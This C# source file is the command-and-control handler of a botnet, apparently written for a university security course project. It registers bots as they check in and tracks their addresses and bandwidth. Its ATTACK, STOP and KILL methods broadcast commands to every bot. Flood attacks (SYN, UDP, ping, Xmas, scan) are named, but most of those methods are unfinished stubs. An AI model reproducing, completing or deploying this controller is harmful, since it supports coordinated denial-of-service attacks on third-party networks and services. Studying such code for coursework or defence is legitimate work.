using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
/** 
*  Author: Angus Moore 2022
*/
namespace Coms4507_Project.BotHandling
{

    /// <summary>
    /// This is the class that handles all bots. It's the main API between internal operations and commands that handle the bot.
    /// 
    /// In essence, any functionality that deals with the bots should be routed through functions written here.
    /// 
    /// NETWORKING AND PHYSICAL COMMUNICATION BETWEEN BOTS WILL BE HANDLED OVER A DIFFERENT OBJECT. IT IS CALLED AT THE EACH FUNCTION (simulated return value).
    /// </summary>
    public class BotHandler
    {
        private readonly NetworkHandler networkHandler; // All interactions with bots is done through here.
        private List<string> bots; // Used to gather all the bots.
        private string ip;

        // These are attack status stuff.
        public string attackType{ get; set; }
        public string requestType = "status";

        public Dictionary<string, string> botIpPortDetails; // botID -> ip::port
        private Dictionary<string, long> botIdUnixTimestamp; // botID -> UNIX Epoch Timestamp (last request)
        private Dictionary<string, float> botIdBandwidth; // botID -> upload speed (message["bandwidth"])
       
        private float totalBandwidth;
        public List<string> outputList;
        private int botExceptionsThrown = 0;

        public BotHandler(string ip)
        {
            bots = new List<string>();
            outputList = new List<string>(); // records the output from the bots.
            networkHandler = new NetworkHandler(ip);

            Action<object> listener = (object obj) =>
             {
                 Listener();
             };
            new Task(listener, "listener").Start();

            Thread thread = new Thread(CheckingForBotUpdater);
            thread.Start();

            botIpPortDetails = new Dictionary<string, string>();
            botIdUnixTimestamp = new Dictionary<string, long>();
            botIdBandwidth = new Dictionary<string, float>();
            totalBandwidth = 0;
            attackType = "none";
        }

        public float GetTotalBandwidth()
        {
            return totalBandwidth;
        }

        public int GetExceptionsThrown()
        {
            return botExceptionsThrown;
        }

        private void CheckingForBotUpdater()
        {
            while(true)
            {
                try
                {
                    // We check that if any bot in the list hasn't responded in 5 seconds, they are considered offline.
                    foreach (string botName in botIpPortDetails.Keys.ToArray())
                    {
                        if (DateTimeOffset.Now.ToUnixTimeSeconds() - botIdUnixTimestamp[botName] > 4)
                        {
                            Trace.WriteLine("DELETING: " + botName + "!!!!");
                            _ = botIpPortDetails.Remove(botName);
                            _ = botIdUnixTimestamp.Remove(botName);
                            totalBandwidth -= botIdBandwidth[botName];
                            _ = botIdBandwidth.Remove(botName);
                        }
                    }
                } catch(Exception ex)
                {
                    Trace.WriteLine(ex.Message);
                }
                
            }
        }
        private void Listener()
        {
            while(true)
            {
                
                try
                {
                    if (outputList.Count > 25) // For the terminal output.
                    {
                        outputList.RemoveAt(0);
                    }

                    // We just loop over this over and over and wait for a message
                    Dictionary<string, string> message = networkHandler.WaitForMessage();
                    JObject jData = JsonConvert.DeserializeObject<JObject>(message["payload"]);

                    // All bots provide this information and only respond with ip, id, status, targetIP, port, error, exceptions thrown
                    string ip = jData.GetValue("ip").ToString();
                    string hostID = jData.GetValue("id").ToString();
                    string status = jData.GetValue("status").ToString();
                    string port = message["port"];

                    // COMMENT THIS BACK IN WHEN LARRY IS OPERATIONAL AGAIN.
                    if (jData.GetValue("exceptionsThrown") != null)
                    {
                        botExceptionsThrown += int.Parse(jData.GetValue("exceptionsThrown").ToString());
                    }
                    outputList.Add(hostID + " :: " + ip + " :: " + status);

                    // this is where the bots are assigned their IDs. It will be reassigned whenever a new IP is created.
                    botIpPortDetails[hostID] = ip + "::" + port;
                    if (jData.GetValue("bandwidth") != null)
                    {
                        float tempBandwidthVal = 0;
                        botIdBandwidth[hostID] = float.Parse(jData.GetValue("bandwidth").ToString());
                        
                        // Updates the total bandwidth of the network.
                        foreach (float upload in botIdBandwidth.Values.ToArray())
                        {
                            tempBandwidthVal += upload;
                        }
                        totalBandwidth = tempBandwidthVal; // Re-assign to then be called by the ViewModel
                    }
  
                    botIdUnixTimestamp[hostID] = DateTimeOffset.Now.ToUnixTimeSeconds(); // Timestamp
                    Trace.WriteLine("BOT MESSAGE: " + hostID + " at time" + botIdUnixTimestamp[hostID]);
                    /* 
                     * 
                     * WHEN THE C2 WANTS TO DISTRIBUTE AN ATTACK, IT WILL INDEPENDENTLY SEND OUT THOSE MESSAGES WITHOUT CHECKING FOR A RESPONSE,
                     * IT WILL JUST DISTRIBUTE IT AND UPDATE THE STATUS ON THE NEXT STATUS LOOP BACK.
                     * 
                     * THE STATES OF THE BOTS WILL BE NOTICED AFTER ONE SUCCESSFUL LOOP OF THESE BOTS. THE BOTS WILL INDEPENDENTLY UPDATE,
                     * SO THERE ARE NO CALLS REQUIRED BEYOND THE DISTRIBUTION OF AN ATTACK AND THEN CHECKING STATUS LIKE USUAL.
                     */

                    // This is just the basic loop response. It just gets status about a bot.
                    Dictionary<string, object> data = new Dictionary<string, object>
                    {
                        { "request", "status" },
                        { "attack", "none" },
                        { "targetIP", "none" },
                        { "ports", "[]" },
                        { "runtime", "*" }
                    };

                    networkHandler.SendMessage(JObject.FromObject(data).ToString(), message["ip"], message["port"]);
                }
                catch (Exception ex)
                {
                    // We should just ignore it.
                    Trace.WriteLine(ex.Message);
                }
            }
        }

        public bool Check_For_Attack()
        {
            switch (requestType)
            {
                case "SYN_FLOOD":
                    // TODO: Build the syn flood attack here, iterating through the list of attackers and issuing out attacks.
                    return true;
                default:
                    return false;
            }
        }

        // TODO: Write the functions for things like sending out commands, stopping bots, bot handling and other things about saving them.
        // There may come a point where the IP Address changes and we need to resolve the location of the bots.
        // The bots will absolutely need a way of connecting with a fixed IP address (probably a heroku nameserver that we write as a reverse proxy).


        public void Issue_SYN_FLOOD()
        {
            foreach(string ipPort in botIpPortDetails.Values.ToArray())
            {
                string ip = ipPort.Split(new string[] { "::" }, StringSplitOptions.None)[0];
                string port = ipPort.Split(new string[] { "::" }, StringSplitOptions.None)[1];

                // Now we just go ahead and distribute the attack message.
                Dictionary<string, string> attackParams = new Dictionary<string, string>();
                attackParams.Add("attack", attackType);
                attackParams.Add("request", "attack");
                attackParams.Add("runtime", "*");
                attackParams.Add("targetIP", "");
                attackParams.Add("ports", "*");
            }
        }

        public void Issue_XMAS_ATTACK()
        {

        }

        public void Issue_PING_FLOOD()
        {

        }

        public void Issue_UDP_FLOOD()
        {

        }

        public void Issue_SCAN_FLOOD()
        {

        }

        public void Issue_BANDWIDTH_ATTACK()
        {

        }

        public void Issue_STOP()
        {

        }

        public void ATTACK(string attackData)
        {
            foreach (string ipPort in botIpPortDetails.Values.ToArray())
            {
                string ip = ipPort.Split(new string[] { "::" }, StringSplitOptions.None)[0];
                string port = ipPort.Split(new string[] { "::" }, StringSplitOptions.None)[1];

                // Now we just go ahead and distribute the attack message.
                networkHandler.SendMessage(attackData, ip, port);
            }

        }

        public void STOP(string attackData)
        {
            foreach (string ipPort in botIpPortDetails.Values.ToArray())
            {
                string ip = ipPort.Split(new string[] { "::" }, StringSplitOptions.None)[0];
                string port = ipPort.Split(new string[] { "::" }, StringSplitOptions.None)[1];

                // Now we just go ahead and distribute the attack message.
                networkHandler.SendMessage(attackData, ip, port);
            }
        }


        public void KILL(string attackData)
        {
            foreach (string ipPort in botIpPortDetails.Values.ToArray())
            {
                string ip = ipPort.Split(new string[] { "::" }, StringSplitOptions.None)[0];
                string port = ipPort.Split(new string[] { "::" }, StringSplitOptions.None)[1];
                // Now we just go ahead and distribute the attack message.
                networkHandler.SendMessage(attackData, ip, port);
            }
        }

    }
}
